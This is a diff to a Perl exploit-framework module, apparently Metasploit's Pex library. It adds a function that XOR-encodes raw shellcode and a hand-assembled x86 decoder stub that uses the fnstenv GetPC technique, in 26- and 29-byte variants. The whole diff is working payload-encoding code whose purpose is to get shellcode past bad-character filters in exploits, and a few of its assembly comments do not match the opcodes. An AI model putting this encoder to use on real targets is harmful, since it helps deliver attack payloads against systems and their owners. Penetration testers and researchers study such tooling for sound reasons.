@@ -58,6 +58,38 @@ sub Encode
     return($shellcode);
 }
 
+sub EncodeFnstenv 
+{
+    my ($rawshell, $xbadc) = @_;
+        
+    my $xorkey = XorKeyScanDword($rawshell, $xbadc);
+    if (! $xorkey)
+    {
+        print "Could not locate valid xor key\n";
+        return;   
+    }
+    
+    my $xordat = XorDword($xorkey, $rawshell);
+    my $encode = XorDecoderDwordFnstenv("x86", $xorkey, length($xordat));
+
+    my $shellcode = $encode . $xordat;
+
+    # If you are using this with msf, this check will happen again inside of
+    # the framework, but the check remains for standalone pex usage
+    # sanity checking, this should never happen
+    foreach my $c (split(//, $xbadc))
+    {
+        if (index($xordat, $c) != -1)
+        {
+            print "Encoder failed: caught character " . sprintf("0x%.2x", ord($c));
+            return;
+        }
+    }
+
+
+    return($shellcode);
+}
+
 
 #
 # These are the current x86 decoders, all of them are static
@@ -188,6 +220,66 @@ sub XorDecoderDword {
                 "\xeb\x05".                   # jmp SHORT 0x1d (xor_done)
                 "\xe8\xe5\xff\xff\xff";       # xor_end: call 0x2 (xor_begin)
                                               # xor_done:
+        }
+
+        return $decoder;
+    }
+
+    return;
+}
+
+# w00t http://archives.neohapsis.com/archives/vuln-dev/2003-q4/0096.html
+# This is useful if you have a BadChar of say 0xff, and your payload is small (or insanely large)
+# enough to not have 0xff in your payload, which is realistic (<= 512 && > 4)
+sub XorDecoderDwordFnstenv {
+    my ($arch, $xor, $len) = @_;
+    if(! $len) { $len = 0x200 }
+
+    # this xor decoder was written by spoonm[at]ghettohackers.net
+    if (lc($arch) eq "x86")
+    {
+	my $smallVersion = 0;
+        # Pad to a 4 byte boundary, the xor data should already be padded
+        # but just incase.
+        my $loopCounter = int(($len - 1) / 4) + 1;
+        $loopCounter *= -1;
+
+        my $xorlen = pack("L", $loopCounter);
+        my $xorkey = pack("L", $xor);
+
+        # If encoded data is small enough, use the single byte sub version
+        if($loopCounter >= -128) {
+            $smallVersion = 1;
+            $xorlen = substr($xorlen, 0, 1);
+        }
+
+# spoon's smaller variable-length encoder
+        my $decoder;
+        if($smallVersion) {
+            # 26 bytes
+            $decoder =
+                "\xd9\xee".                   # fldz
+                "\xd9\x74\x24\xf4".           # fnstenv [esp - 12]
+                "\x5b".                       # pop ebx
+                "\x83\xc3\x1a".               # add ebx, BYTE 26
+                "\x31\xc9".                   # xor ecx,ecx
+                "\x83\xe9". $xorlen .         # sub ecx, BYTE -xorlen
+                "\x81\x33". $xorkey .         # xor_xor: xor DWORD [ebx],xorkey
+                "\x83\xeb\xfc".               # sub $esi,-4
+                "\xe2\xf5"                    # loop 0x8 (xor_xor)
+        }
+        else {
+            # 29 bytes
+            $decoder =
+                "\xd9\xee".                   # fldz
+                "\xd9\x74\x24\xf4".           # fnstenv [esp - 12]
+                "\x5b".                       # pop ebx
+                "\x83\xc3\x1d".               # add ebx, BYTE 29
+                "\x31\xc9".                   # xor ecx,ecx
+                "\x81\xe9". $xorlen .         # sub ecx, BYTE -xorlen
+                "\x81\x33". $xorkey .         # xor_xor: xor DWORD [ebx],xorkey
+                "\x83\xeb\xfc".               # sub $esi,-4
+                "\xe2\xf5"                    # loop 0x8 (xor_xor)
         }
 
         return $decoder;
